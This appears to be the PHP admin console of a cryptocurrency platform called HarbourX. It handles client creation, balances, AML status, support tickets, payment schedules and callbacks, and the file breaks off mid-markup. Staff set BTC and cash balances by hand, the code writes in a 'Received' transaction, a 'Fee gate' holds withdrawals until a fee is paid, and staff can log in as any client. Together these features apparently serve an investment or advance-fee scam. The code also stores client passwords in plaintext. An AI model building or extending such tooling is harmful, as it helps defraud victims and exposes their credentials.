<?php
require_once __DIR__ . '/admin_common.php';

$error = '';
$message = cleanText($_GET['msg'] ?? '');

function publicAppBaseUrl() {
    $https = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';
    $scheme = $https ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? ''));
    $dir = ($dir === '/' || $dir === '.') ? '' : rtrim($dir, '/');
    return $scheme . '://' . $host . $dir;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['admin_login'])) {
    if (($_POST['admin_password'] ?? '') === $ADMIN_PASSWORD) {
        $_SESSION['admin_logged_in'] = true;
        header('Location: admin.php');
        exit;
    }
    $error = 'Wrong admin password';
}

if (empty($_SESSION['admin_logged_in'])) {
    pageHeader('Admin Login');
    echo '<div class="login-fab">' . themeToggleButton() . '</div>';
    echo '<div class="page" style="max-width:none"><div class="login-box card"><div class="badge">' . hxMark() . '</div><h1>HarbourX Admin</h1>';
    echo '<p class="hint" style="text-align:center;margin-bottom:18px">Client operations, portfolio adjustments, AML review and bank withdrawals.</p>';
    if ($error) echo '<div class="notice error">' . htmlspecialchars($error) . '</div>';
    echo '<form method="post"><div class="field"><label>Admin password</label><input type="password" name="admin_password" autofocus required></div><br><button class="btn btn-blue" style="width:100%;height:46px" name="admin_login">Sign in to console</button></form></div></div></body></html>';
    exit;
}

$users = loadUsers($usersFile);

if (isset($_POST['create_user'])) {
    $email = cleanText($_POST['email'] ?? '');
    $password = cleanText($_POST['password'] ?? '');
    $name = cleanText($_POST['name'] ?? '');
    $btc = cleanNumber($_POST['btc'] ?? 0);
    $mainBalance = cleanNumber($_POST['main_balance'] ?? 0);
    $country = cleanCountryCode($_POST['country'] ?? '');
    $currency = cleanCurrency($_POST['currency'] ?? defaultCurrencyForCountry($country));
    $btcWalletAddress = cleanBtcAddress($_POST['btc_wallet_address'] ?? '');

    if (!$email || !$password || !$name || !$country) {
        $error = 'Name, email, password, and country are required.';
    } elseif (findUserIndex($users, $email) !== -1) {
        $error = 'A user with this email already exists.';
    } elseif ($btcWalletAddress !== '' && !isValidBtcAddress($btcWalletAddress)) {
        $error = 'Enter a valid Bitcoin wallet address, or leave it blank.';
    } else {
        $users[] = [
            'email' => $email,
            'password' => $password,
            'name' => $name,
            'portfolioUsd' => 0,
            'btc' => $btc,
            'mainBalance' => $mainBalance,
            'withdrawalFeeRequired' => !empty($_POST['withdrawal_fee_required']),
            'withdrawalFeeAmount' => round(max(0, cleanNumber($_POST['main_fee_amount'] ?? 0)), 2),
            'withdrawalFeePercent' => 0,
            'withdrawalFeeNote' => '',
            'country' => $country,
            'currency' => $currency,
            'btcWalletAddress' => $btcWalletAddress,
            'amlStatus' => 'unverified',
            'amlSubmittedAt' => '',
            'amlReviewedAt' => '',
            'amlReviewNote' => '',
            'bankAccounts' => [],
            'transactions' => [[
                'date' => date('Y-m-d'),
                'type' => 'Received',
                'amount' => '+' . number_format($btc, 2, '.', '') . ' BTC',
                'status' => 'Completed',
                'details' => 'BTC account',
                'detailsUrl' => ''
            ]]
        ];
        saveUsers($usersFile, $users);
        header('Location: admin.php?msg=' . urlencode('Client created successfully.'));
        exit;
    }
}

if (isset($_POST['delete_user'])) {
    $emailToDelete = strtolower(cleanText($_POST['delete_email'] ?? ''));
    $users = array_values(array_filter($users, function($u) use ($emailToDelete) {
        return strtolower($u['email'] ?? '') !== $emailToDelete;
    }));
    saveUsers($usersFile, $users);
    header('Location: admin.php?msg=' . urlencode('Client deleted successfully.'));
    exit;
}

if (isset($_POST['delete_bank_account'])) {
    $emailToUpdate = cleanText($_POST['bank_user_email'] ?? '');
    $bankId = cleanText($_POST['bank_account_id'] ?? '');
    $bankIndex = isset($_POST['bank_account_index']) ? (int)$_POST['bank_account_index'] : -1;
    $userIndex = findUserIndex($users, $emailToUpdate);

    if ($userIndex === -1) {
        $error = 'Client not found for connected payout bank.';
    } else {
        $bankAccounts = is_array($users[$userIndex]['bankAccounts'] ?? null) ? $users[$userIndex]['bankAccounts'] : [];
        $beforeCount = count($bankAccounts);

        if ($bankId !== '') {
            $bankAccounts = array_values(array_filter($bankAccounts, function($bank) use ($bankId) {
                return (string)($bank['id'] ?? '') !== $bankId;
            }));
        } elseif ($bankIndex >= 0 && isset($bankAccounts[$bankIndex])) {
            unset($bankAccounts[$bankIndex]);
            $bankAccounts = array_values($bankAccounts);
        }

        if (count($bankAccounts) === $beforeCount) {
            $error = 'Connected payout bank not found.';
        } else {
            $users[$userIndex]['bankAccounts'] = $bankAccounts;
            saveUsers($usersFile, $users);
            header('Location: admin.php?msg=' . urlencode('Connected payout bank removed. The client must add it again before withdrawing.'));
            exit;
        }
    }
}

/* ---------------------------------------------------------------------------
   Support tickets

   Clients open them through support.php; staff answer them here. Both sides
   read and write the same data/tickets.json.
   --------------------------------------------------------------------------- */
$ticketsFile = __DIR__ . '/data/tickets.json';

function loadTickets($file) {
    if (!file_exists($file)) return [];
    $data = json_decode((string)file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

function saveTickets($file, $tickets) {
    if (!is_dir(dirname($file))) mkdir(dirname($file), 0755, true);
    file_put_contents($file, json_encode(array_values($tickets), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

if (isset($_POST['ticket_reply']) || isset($_POST['ticket_close'])) {
    $ticketList = loadTickets($ticketsFile);
    $ticketId = cleanText($_POST['ticket_id'] ?? '');

    foreach ($ticketList as $i => $ticket) {
        if ((string)($ticket['id'] ?? '') !== $ticketId) continue;

        if (isset($_POST['ticket_close'])) {
            $ticketList[$i]['status'] = 'closed';
            $ticketList[$i]['updatedAt'] = gmdate('c');
        } else {
            $body = trim((string)($_POST['ticket_body'] ?? ''));
            $body = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/u', '', $body);
            $body = function_exists('mb_substr') ? mb_substr($body, 0, 4000) : substr($body, 0, 4000);
            if ($body === '') break;
            $ticketList[$i]['messages'][] = ['from' => 'staff', 'body' => $body, 'at' => gmdate('c')];
            $ticketList[$i]['status'] = 'answered';
            $ticketList[$i]['updatedAt'] = gmdate('c');
        }
        saveTickets($ticketsFile, $ticketList);
        break;
    }
    header('Location: admin.php#support');
    exit;
}

$supportTickets = loadTickets($ticketsFile);
usort($supportTickets, static function ($a, $b) {
    // Anything still waiting on us first, then most recently touched.
    $aOpen = ($a['status'] ?? '') === 'open' ? 0 : 1;
    $bOpen = ($b['status'] ?? '') === 'open' ? 0 : 1;
    if ($aOpen !== $bOpen) return $aOpen - $bOpen;
    return strcmp((string)($b['updatedAt'] ?? ''), (string)($a['updatedAt'] ?? ''));
});
$openTicketCount = count(array_filter($supportTickets, static fn($t) => ($t['status'] ?? '') === 'open'));

$users = loadUsers($usersFile);
$totalUsers = count($users);
$totalBtc = 0; $totalTransactions = 0; $verifiedAml = 0; $pendingAml = 0; $connectedBanks = 0; $clientsWithBanks = 0; $withdrawalAuthorisations = [];
$btcWithdrawals = [];
foreach ($users as $u) {
    $totalBtc += (float)($u['btc'] ?? 0);
    $totalTransactions += count($u['transactions'] ?? []);
    if (amlStatus($u) === 'verified') $verifiedAml++;
    if (amlStatus($u) === 'under_review') $pendingAml++;
    $userBankAccounts = is_array($u['bankAccounts'] ?? null) ? $u['bankAccounts'] : [];
    $connectedBanks += count($userBankAccounts);
    if (count($userBankAccounts) > 0) $clientsWithBanks++;
    foreach ((is_array($u['transactions'] ?? null) ? $u['transactions'] : []) as $tx) {
        if (($tx['type'] ?? '') === 'Bitcoin Withdrawal') {
            $btcWithdrawals[] = $tx + ['clientEmail' => $u['email'] ?? '', 'clientName' => $u['name'] ?? ''];
        }
        if (trim((string)($tx['withdrawalAuthorisationFirstName'] ?? '')) !== '') {
            $withdrawalAuthorisations[] = [
                'user' => $u,
                'transaction' => $tx
            ];
        }
    }
}

// Newest first, so whatever arrived last is at the top of the queue.
usort($btcWithdrawals, static fn($a, $b) => strcmp(
    (string)($b['btcWithdrawalSubmittedAt'] ?? ''),
    (string)($a['btcWithdrawalSubmittedAt'] ?? '')
));
$pendingBtcWithdrawals = count(array_filter($btcWithdrawals, static fn($t) => ($t['status'] ?? '') === 'In review'));

usort($withdrawalAuthorisations, function($a, $b) {
    return strcmp(
        (string)($b['transaction']['withdrawalAuthorisedAt'] ?? $b['transaction']['date'] ?? ''),
        (string)($a['transaction']['withdrawalAuthorisedAt'] ?? $a['transaction']['date'] ?? '')
    );
});

$adminSnapshot = currentAdminAlertSnapshot();
$paymentStats = $adminSnapshot['paymentStats'];
$callbackStats = $adminSnapshot['callbackStats'];
$adminAlerts = $adminSnapshot['items'];
$paymentTotal = array_sum($paymentStats);
$callbackTotal = $callbackStats['upcoming'] + $callbackStats['due'] + $callbackStats['completed'] + $callbackStats['cancelled'];
$dashboardDate = (new DateTimeImmutable('now', new DateTimeZone(HX_ADMIN_TIMEZONE)))->format('l, M j');
$createPanelOpen = isset($_POST['create_user']) && $error !== '';
$dashboardNowUtc = new DateTimeImmutable('now', new DateTimeZone('UTC'));
$dashboardToday = $dashboardNowUtc->setTimezone(new DateTimeZone(HX_ADMIN_TIMEZONE))->format('Y-m-d');
$clientNextPayments = [];
foreach (hxPaymentLoad(__DIR__ . '/data/payment_schedules.json') as $record) {
    $email = strtolower(trim((string)($record['clientEmail'] ?? '')));
    $status = hxPaymentEffectiveStatus($record, $dashboardToday);
    if ($email === '' || $status === 'paid') continue;
    $rank = in_array($status, ['overdue', 'missed'], true) ? 0 : 1;
    $sortKey = $rank . ':' . (string)($record['dueDate'] ?? '9999-12-31');
    if (!isset($clientNextPayments[$email]) || $sortKey < $clientNextPayments[$email]['sortKey']) {
        $clientNextPayments[$email] = ['record' => $record, 'status' => $status, 'sortKey' => $sortKey];
    }
}
$clientNextCallbacks = [];
foreach (hxFollowupLoad(__DIR__ . '/data/client_callbacks.json') as $record) {
    $email = strtolower(trim((string)($record['clientEmail'] ?? '')));
    $status = hxFollowupEffectiveStatus($record, $dashboardNowUtc);
    if ($email === '' || !in_array($status, ['due', 'upcoming'], true)) continue;
    $rank = $status === 'due' ? 0 : 1;
    $sortKey = $rank . ':' . (string)($record['scheduledAt'] ?? '9999-12-31');
    if (!isset($clientNextCallbacks[$email]) || $sortKey < $clientNextCallbacks[$email]['sortKey']) {
        $clientNextCallbacks[$email] = ['record' => $record, 'status' => $status, 'sortKey' => $sortKey];
    }
}

pageHeader('Clients');
pageTop('clients');
if ($message) echo '<div class="notice success">' . htmlspecialchars($message) . '</div>';
if ($error) echo '<div class="notice error">' . htmlspecialchars($error) . '</div>';
$registrationLink = publicAppBaseUrl() . '/register.php';
?>

<section class="card dashboard-overview" data-dashboard-overview>
  <div class="dashboard-overview-head">
    <div>
      <span class="ops-eyebrow">Operations overview · <?= htmlspecialchars($dashboardDate) ?></span>
      <h2>Good overview, faster decisions.</h2>
      <p>Clients, money, compliance and follow-ups in one calm workspace.</p>
    </div>
    <div class="actions dashboard-quick-actions">
      <button class="btn btn-blue" type="button" data-panel-toggle="create-client" aria-expanded="<?= $createPanelOpen ? 'true' : 'false' ?>">+ New client</button>
      <a class="btn btn-light" href="payments.php#add-payment">Add payment</a>
      <a class="btn btn-light" href="callbacks.php#schedule-callback">Schedule callback</a>
    </div>
  </div>

  <div class="dashboard-kpis">
    <a class="dashboard-kpi kpi-teal" href="#clients">
      <span class="dashboard-kpi-icon">CL</span>
      <span><small>Clients</small><strong data-dashboard-count="<?= $totalUsers ?>"><?= $totalUsers ?></strong><em><?= $verifiedAml ?> AML verified</em></span>
    </a>
    <div class="dashboard-kpi kpi-blue">
      <span class="dashboard-kpi-icon">₿</span>
      <span><small>Total Bitcoin</small><strong data-dashboard-count="<?= htmlspecialchars((string)$totalBtc) ?>" data-decimals="8"><?= htmlspecialchars(number_format($totalBtc, 8)) ?></strong><em><?= $totalTransactions ?> transactions</em></span>
    </div>
    <a class="dashboard-kpi kpi-red" href="payments.php?status=overdue">
      <span class="dashboard-kpi-icon">!</span>
      <span><small>Payments overdue</small><strong data-dashboard-count="<?= (int)$paymentStats['overdue'] ?>" data-stat-payment-overdue><?= (int)$paymentStats['overdue'] ?></strong><em><?= (int)$paymentStats['pending'] ?> still pending</em></span>
    </a>
    <a class="dashboard-kpi kpi-amber" href="callbacks.php?status=due">
      <span class="dashboard-kpi-icon">↗</span>
      <span><small>Callbacks due</small><strong data-dashboard-count="<?= (int)$callbackStats['due'] ?>" data-stat-callback-due><?= (int)$callbackStats['due'] ?></strong><em><?= (int)$callbackStats['today'] ?> scheduled today</em></span>
    </a>
  </div>

  <div class="dashboard-attention-strip">
    <span>Also watching</span>
    <a href="admin.php#clients"><b><?= $pendingAml ?></b> AML reviews</a>
    <a href="admin.php#support"><b><?= $openTicketCount ?></b> open tickets</a>
    <a href="admin.php#btc-withdrawals"><b><?= (int)$pendingBtcWithdrawals ?></b> BTC withdrawals</a>
    <a href="callbacks.php"><b data-stat-callback-today><?= (int)$callbackStats['today'] ?></b> callbacks today</a>
  </div>
</section>

<div class="dashboard-visual-grid" data-dashboard-overview>
  <section class="card dashboard-chart-card">
    <div class="section-title"><div><span class="ops-eyebrow">Cashflow</span><h2>Payment status</h2><p class="hint" style="margin:0">Current schedule at a glance.</p></div><a class="btn btn-light" href="payments.php">Open payments</a></div>
    <div class="dashboard-donut-layout">
      <div class="dashboard-donut">
        <svg viewBox="0 0 120 120" role="img" aria-label="Payment status chart">
          <circle class="dashboard-donut-track" cx="60" cy="60" r="48"></circle>
          <g transform="rotate(-90 60 60)">
            <circle class="dashboard-donut-segment donut-paid" cx="60" cy="60" r="48" data-donut-value="<?= (int)$paymentStats['paid'] ?>"></circle>
            <circle class="dashboard-donut-segment donut-pending" cx="60" cy="60" r="48" data-donut-value="<?= (int)$paymentStats['pending'] ?>"></circle>
            <circle class="dashboard-donut-segment donut-overdue" cx="60" cy="60" r="48" data-donut-value="<?= (int)$paymentStats['overdue'] ?>"></circle>
            <circle class="dashboard-donut-segment donut-missed" cx="60" cy="60" r="48" data-donut-value="<?= (int)$paymentStats['missed'] ?>"></circle>
          </g>
        </svg>
        <div><strong data-dashboard-count="<?= $paymentTotal ?>"><?= $paymentTotal ?></strong><span>Total</span></div>
      </div>
      <div class="dashboard-chart-legend">
        <a href="payments.php?status=paid"><i class="legend-paid"></i><span>Paid</span><b><?= (int)$paymentStats['paid'] ?></b></a>
        <a href="payments.php?status=pending"><i class="legend-pending"></i><span>Pending</span><b data-stat-payment-pending><?= (int)$paymentStats['pending'] ?></b></a>
        <a href="payments.php?status=overdue"><i class="legend-overdue"></i><span>Overdue</span><b><?= (int)$paymentStats['overdue'] ?></b></a>
        <a href="payments.php?status=missed"><i class="legend-missed"></i><span>Not paid</span><b><?= (int)$paymentStats['missed'] ?></b></a>
      </div>
    </div>
  </section>

  <section class="card dashboard-chart-card">
    <div class="section-title"><div><span class="ops-eyebrow">Progress</span><h2>Client readiness</h2><p class="hint" style="margin:0">Completion across key operations.</p></div><a class="btn btn-light" href="#clients">View clients</a></div>
    <div class="dashboard-progress-list">
      <div class="dashboard-progress-row"><div><span>AML verified</span><b><?= $verifiedAml ?>/<?= $totalUsers ?></b></div><div class="dashboard-progress-track"><span class="bar-teal" data-dashboard-bar data-value="<?= $verifiedAml ?>" data-max="<?= max(1, $totalUsers) ?>" style="width:<?= $totalUsers ? round($verifiedAml / $totalUsers * 100, 1) : 0 ?>%"></span></div></div>
      <div class="dashboard-progress-row"><div><span>Bank connected</span><b><?= $clientsWithBanks ?>/<?= $totalUsers ?></b></div><div class="dashboard-progress-track"><span class="bar-blue" data-dashboard-bar data-value="<?= $clientsWithBanks ?>" data-max="<?= max(1, $totalUsers) ?>" style="width:<?= $totalUsers ? round($clientsWithBanks / $totalUsers * 100, 1) : 0 ?>%"></span></div></div>
      <div class="dashboard-progress-row"><div><span>Payments completed</span><b><?= (int)$paymentStats['paid'] ?>/<?= $paymentTotal ?></b></div><div class="dashboard-progress-track"><span class="bar-green" data-dashboard-bar data-value="<?= (int)$paymentStats['paid'] ?>" data-max="<?= max(1, $paymentTotal) ?>" style="width:<?= $paymentTotal ? round($paymentStats['paid'] / $paymentTotal * 100, 1) : 0 ?>%"></span></div></div>
      <div class="dashboard-progress-row"><div><span>Callbacks completed</span><b><?= (int)$callbackStats['completed'] ?>/<?= $callbackTotal ?></b></div><div class="dashboard-progress-track"><span class="bar-amber" data-dashboard-bar data-value="<?= (int)$callbackStats['completed'] ?>" data-max="<?= max(1, $callbackTotal) ?>" style="width:<?= $callbackTotal ? round($callbackStats['completed'] / $callbackTotal * 100, 1) : 0 ?>%"></span></div></div>
    </div>
  </section>
</div>

<div class="dashboard-utility-grid">
  <section class="card dashboard-alert-card" id="alerts">
    <div class="section-title"><div><span class="ops-eyebrow">Needs attention</span><h2>Notifications</h2><p class="hint" style="margin:0" data-alert-summary><?= htmlspecialchars($adminSnapshot['body']) ?></p></div><button class="btn btn-light" type="button" id="enableDesktopAlerts">Enable desktop alerts</button></div>
    <div class="admin-alert-list">
      <?php if (!$adminAlerts): ?><div class="dashboard-all-clear" data-alert-empty><span>✓</span><div><b>All clear</b><small>No urgent alerts right now.</small></div></div>
      <?php else: foreach (array_slice($adminAlerts, 0, 4) as $alert): ?>
        <a class="admin-alert admin-alert-<?= htmlspecialchars($alert['level']) ?>" href="<?= htmlspecialchars($alert['href']) ?>"><span class="admin-alert-dot"></span><span><b><?= htmlspecialchars($alert['title']) ?></b><small><?= htmlspecialchars($alert['detail']) ?></small></span><span class="admin-alert-arrow">&rarr;</span></a>
      <?php endforeach; endif; ?>
    </div>
  </section>

  <section class="card dashboard-onboarding-card">
    <span class="ops-eyebrow">Onboarding</span><h2>Invite a client</h2><p class="hint">Share the signup link or create the client yourself.</p>
    <div class="dashboard-link-box"><input id="registrationLink" value="<?= htmlspecialchars($registrationLink) ?>" readonly onclick="this.select()"><button class="btn btn-light" type="button" onclick="navigator.clipboard.writeText(document.getElementById('registrationLink').value); this.textContent='Copied';">Copy</button></div>
    <div class="actions"><a class="btn btn-light" href="<?= htmlspecialchars($registrationLink) ?>" target="_blank" rel="noopener noreferrer">Open signup</a><button class="btn btn-blue" type="button" data-panel-toggle="create-client" aria-expanded="<?= $createPanelOpen ? 'true' : 'false' ?>">+ New client</button></div>
  </section>
</div>

<section class="card ops-create-panel dashboard-client-create" id="create-client" data-open="<?= $createPanelOpen ? 'true' : 'false' ?>" <?= $createPanelOpen ? '' : 'hidden' ?>>
  <div class="section-title"><div><span class="ops-eyebrow">New account</span><h2>Create client</h2><p class="hint" style="margin:0">Start with the essentials; balances and wallet details are optional.</p></div></div>
  <form method="post">
    <div class="ops-form-grid">
      <div class="field ops-span-2"><label>Name</label><input name="name" value="<?= htmlspecialchars($_POST['name'] ?? '') ?>" placeholder="John Smith" required></div>
      <div class="field ops-span-2"><label>Email</label><input type="email" name="email" value="<?= htmlspecialchars($_POST['email'] ?? '') ?>" placeholder="email@example.com" required></div>
      <div class="field ops-span-2"><label>Password</label><input type="password" name="password" value="<?= htmlspecialchars($_POST['password'] ?? '') ?>" placeholder="Temporary password" required></div>
      <div class="field"><label>Country</label><select name="country" class="country-select" data-currency-target="createCurrency" required><?= renderCountryOptions($_POST['country'] ?? 'AU') ?></select></div>
      <div class="field"><label>Main currency</label><select id="createCurrency" name="currency" required><?= renderCurrencyOptions(cleanCurrency($_POST['currency'] ?? 'AUD')) ?></select></div>
    </div>
    <details class="ops-advanced"><summary>Balances, wallet and withdrawal fee</summary><div class="ops-form-grid">
      <div class="field"><label>BTC balance</label><input name="btc" type="number" step="0.00000001" value="<?= htmlspecialchars($_POST['btc'] ?? '') ?>" placeholder="0.00000000"></div>
      <div class="field"><label>Main balance</label><input name="main_balance" type="number" step="0.01" value="<?= htmlspecialchars($_POST['main_balance'] ?? '') ?>" placeholder="0.00"></div>
      <div class="field"><label>Withdrawal fee</label><input name="main_fee_amount" type="number" step="0.01" min="0" value="<?= htmlspecialchars($_POST['main_fee_amount'] ?? '') ?>" placeholder="0.00"></div>
      <div class="field"><label>Require fee</label><label class="btn btn-light dashboard-check"><input type="checkbox" name="withdrawal_fee_required" value="1" <?= !empty($_POST['withdrawal_fee_required']) ? 'checked' : '' ?>> Fee gate</label></div>
      <div class="field ops-span-2"><label>BTC wallet address</label><input name="btc_wallet_address" value="<?= htmlspecialchars($_POST['btc_wallet_address'] ?? '') ?>" placeholder="bc1... or 1... / 3..." autocapitalize="off" autocorrect="off" spellcheck="false"></div>
    </div></details>
    <div class="ops-form-actions"><button class="btn btn-blue" name="create_user">Create client</button><button class="btn btn-light" type="button" data-panel-toggle="create-client">Cancel</button></div>
  </form>
</section>

<section class="card clients-workspace clients-hybrid-workspace" id="clients" data-client-directory>
  <div class="clients-directory-head">
    <div><span class="ops-eyebrow">Client directory</span><h2>Clients</h2><p>Find the right client and reach their key operations quickly.</p></div>
    <div class="clients-directory-stats">
      <span><b><?= $totalUsers ?></b> total</span>
      <span><b><?= $verifiedAml ?></b> verified</span>
      <span><b><?= $clientsWithBanks ?></b> bank ready</span>
    </div>
  </div>
  <div class="clients-toolbar">
    <label class="clients-search">
      <span>Search clients</span>
      <div><i aria-hidden="true">⌕</i><input id="clientSearch" type="search" placeholder="Name, email, country or currency…" autocomplete="off"></div>
    </label>
    <label class="clients-filter"><span>Status</span><select id="clientStatusFilter" data-client-filter>
      <option value="all">All clients</option>
      <option value="verified">AML verified</option>
      <option value="under_review">AML under review</option>
      <option value="unverified">AML unverified</option>
      <option value="bank">Bank connected</option>
      <option value="fee">Fee required</option>
    </select></label>
    <label class="clients-filter"><span>Sort by</span><select id="clientSort" data-client-sort>
      <option value="name">Name A–Z</option>
      <option value="main">Highest balance</option>
      <option value="btc">Highest BTC</option>
      <option value="tx">Most transactions</option>
    </select></label>
    <div class="clients-visible-count"><strong data-client-visible><?= $totalUsers ?></strong><span>showing</span></div>
  </div>
  <?php if (!$users): ?>
    <div class="empty">No clients yet.</div>
  <?php else: ?>
    <div class="client-hybrid-layout">
      <div class="clients-table-shell">
        <table class="clients-table">
          <thead><tr><th>Client</th><th>AML</th><th>Main balance</th><th>Bitcoin</th><th>Next payment</th><th>Callback</th><th><span class="sr-only">Quick view</span></th></tr></thead>
          <tbody id="clientGrid" data-client-list>
          <?php foreach ($users as $u):
            $txCount = count($u['transactions'] ?? []);
            $lastTx = $txCount ? end($u['transactions']) : null;
            $userBankCount = count(is_array($u['bankAccounts'] ?? null) ? $u['bankAccounts'] : []);
            $userAmlStatus = amlStatus($u);
            $feeRequired = !empty($u['withdrawalFeeRequired']);
            $emailKey = strtolower(trim((string)($u['email'] ?? '')));
            $paymentInfo = $clientNextPayments[$emailKey] ?? null;
            $paymentRecord = $paymentInfo['record'] ?? [];
            $paymentStatus = $paymentInfo['status'] ?? 'none';
            $paymentDate = (string)($paymentRecord['dueDate'] ?? '');
            $paymentTitle = hxPaymentValidDate($paymentDate) ? (new DateTimeImmutable($paymentDate))->format('M j, Y') : 'Not scheduled';
            $paymentMeta = $paymentStatus === 'none' ? 'No active payment' : hxPaymentStatusLabel($paymentStatus) . ' · ' . formatMoney($paymentRecord['amount'] ?? 0, $paymentRecord['currency'] ?? 'USD');
            $callbackInfo = $clientNextCallbacks[$emailKey] ?? null;
            $callbackRecord = $callbackInfo['record'] ?? [];
            $callbackStatus = $callbackInfo['status'] ?? 'none';
            $callbackTitle = $callbackStatus === 'none' ? 'Not scheduled' : hxFollowupDisplayTime($callbackRecord['scheduledAt'] ?? '', HX_ADMIN_TIMEZONE);
            $callbackMeta = $callbackStatus === 'none' ? 'No active callback' : hxFollowupStatusLabel($callbackStatus) . (!empty($callbackRecord['subject']) ? ' · ' . $callbackRecord['subject'] : '');
            $lastTitle = $lastTx['type'] ?? 'No transactions yet';
            $lastMeta = $lastTx ? (($lastTx['amount'] ?? '') . (!empty($lastTx['date']) ? ' · ' . $lastTx['date'] : '')) : 'Ready for first activity';
          ?>
            <tr class="searchable-client" data-client-record data-search="<?= htmlspecialchars(strtolower(($u['name'] ?? '') . ' ' . ($u['email'] ?? '') . ' ' . countryName($u['country'] ?? '') . ' ' . ($u['currency'] ?? ''))) ?>" data-name="<?= htmlspecialchars(strtolower($u['name'] ?? '')) ?>" data-aml="<?= htmlspecialchars($userAmlStatus) ?>" data-bank="<?= $userBankCount ? '1' : '0' ?>" data-fee="<?= $feeRequired ? '1' : '0' ?>" data-main="<?= htmlspecialchars((string)clientMainBalance($u)) ?>" data-btc="<?= htmlspecialchars((string)((float)($u['btc'] ?? 0))) ?>" data-tx="<?= $txCount ?>" data-email="<?= htmlspecialchars($emailKey) ?>" data-quick-name="<?= htmlspecialchars($u['name'] ?? '') ?>" data-quick-initials="<?= htmlspecialchars(initials($u['name'] ?? '')) ?>" data-quick-country="<?= htmlspecialchars(countryName($u['country'] ?? '') ?: 'Country not set') ?>" data-quick-currency="<?= htmlspecialchars(cleanCurrency($u['currency'] ?? 'USD')) ?>" data-quick-main="<?= htmlspecialchars(formatMoney(clientMainBalance($u), $u['currency'] ?? 'USD')) ?>" data-quick-btc="<?= htmlspecialchars(number_format((float)($u['btc'] ?? 0), 8)) ?> BTC" data-quick-payment-title="<?= htmlspecialchars($paymentTitle) ?>" data-quick-payment-meta="<?= htmlspecialchars($paymentMeta) ?>" data-quick-payment-state="<?= htmlspecialchars($paymentStatus) ?>" data-quick-callback-title="<?= htmlspecialchars($callbackTitle) ?>" data-quick-callback-meta="<?= htmlspecialchars($callbackMeta) ?>" data-quick-callback-state="<?= htmlspecialchars($callbackStatus) ?>" data-quick-last-title="<?= htmlspecialchars($lastTitle) ?>" data-quick-last-meta="<?= htmlspecialchars($lastMeta) ?>">
              <td class="client-table-person" data-label="Client"><div class="avatar"><?= htmlspecialchars(initials($u['name'] ?? '')) ?></div><div><strong><?= htmlspecialchars($u['name'] ?? '') ?></strong><span><?= htmlspecialchars($u['email'] ?? '') ?></span><small><?= htmlspecialchars(countryName($u['country'] ?? '') ?: 'Country not set') ?> · <?= htmlspecialchars(cleanCurrency($u['currency'] ?? 'USD')) ?></small></div></td>
              <td class="client-table-status" data-label="AML"><span class="aml-badge aml-<?= htmlspecialchars($userAmlStatus) ?>"><?= htmlspecialchars(amlStatusLabel($userAmlStatus)) ?></span><?php if ($userBankCount): ?><span class="bank-connected-badge">✓ Bank</span><?php endif; ?><?php if ($feeRequired): ?><span class="aml-badge aml-under_review">Fee</span><?php endif; ?></td>
              <td class="client-table-number" data-label="Main balance"><strong><?= htmlspecialchars(formatMoney(clientMainBalance($u), $u['currency'] ?? 'USD')) ?></strong><span><?= htmlspecialchars(cleanCurrency($u['currency'] ?? 'USD')) ?></span></td>
              <td class="client-table-number" data-label="Bitcoin"><strong><?= htmlspecialchars(number_format((float)($u['btc'] ?? 0), 8)) ?></strong><span>BTC</span></td>
              <td class="client-table-followup followup-<?= htmlspecialchars($paymentStatus) ?>" data-label="Next payment"><strong><?= htmlspecialchars($paymentTitle) ?></strong><span><?= htmlspecialchars($paymentMeta) ?></span></td>
              <td class="client-table-followup followup-<?= htmlspecialchars($callbackStatus) ?>" data-label="Callback"><strong><?= htmlspecialchars($callbackTitle) ?></strong><span><?= htmlspecialchars($callbackMeta) ?></span></td>
              <td class="client-table-action"><button class="btn btn-light" type="button" data-client-open aria-controls="clientQuickView">Quick view</button><a class="btn btn-blue client-mobile-open" href="client.php?email=<?= urlencode($emailKey) ?>">Open</a></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      </div>

      <aside class="client-quick-view" id="clientQuickView" aria-label="Selected client details" tabindex="-1" aria-live="polite">
        <div class="client-quick-head"><span class="ops-eyebrow">Quick view</span><span class="client-quick-position">Selected client</span></div>
        <div class="client-quick-profile"><div class="avatar" data-quick-field="initials">—</div><div><h3 data-quick-field="name">Select a client</h3><p data-quick-field="email">Choose a row to see the overview.</p><div class="client-quick-badges"><span class="aml-badge aml-unverified" data-quick-aml>Unverified</span><span class="bank-connected-badge" data-quick-bank hidden>✓ Bank connected</span></div></div></div>
        <div class="client-quick-balances"><div><small>Main balance</small><strong data-quick-field="main">—</strong></div><div><small>Bitcoin</small><strong data-quick-field="btc">—</strong></div></div>
        <div class="client-quick-meta"><span data-quick-field="country">—</span><i></i><span data-quick-field="currency">—</span><i></i><span><b data-quick-field="tx">0</b> transactions</span></div>
        <div class="client-quick-schedule">
          <div data-quick-state="payment"><span class="client-quick-icon">$</span><div><small>Next payment</small><strong data-quick-field="payment-title">—</strong><p data-quick-field="payment-meta">—</p></div></div>
          <div data-quick-state="callback"><span class="client-quick-icon">↗</span><div><small>Next callback</small><strong data-quick-field="callback-title">—</strong><p data-quick-field="callback-meta">—</p></div></div>
          <div><span class="client-quick-icon">•</span><div><small>Latest activity</small><strong data-quick-field="last-title">—</strong><p data-quick-field="last-meta">—</p></div></div>
        </div>
        <div class="client-quick-actions"><a class="btn btn-blue" data-quick-link="profile" href="#">Open profile</a><a class="btn btn-light" data-quick-link="payment" href="#">Add payment</a><a class="btn btn-light" data-quick-link="callback" href="#">Schedule callback</a></div>
        <details class="client-quick-more"><summary>More client actions <span>⌄</span></summary><div>
          <a data-quick-link="transactions" href="#">View transactions</a>
          <form method="post" action="client.php" target="_blank"><input type="hidden" name="original_email" data-quick-email-field><button name="login_as_client" type="submit">Log in as client</button></form>
          <form method="post" action="client.php"><input type="hidden" name="original_email" data-quick-email-field><button name="generate_password_setup_link" type="submit">Generate setup link</button></form>
          <form method="post" onsubmit="return confirm('Delete this client?')"><input type="hidden" name="delete_email" data-quick-email-field><button class="is-danger" name="delete_user">Delete client</button></form>
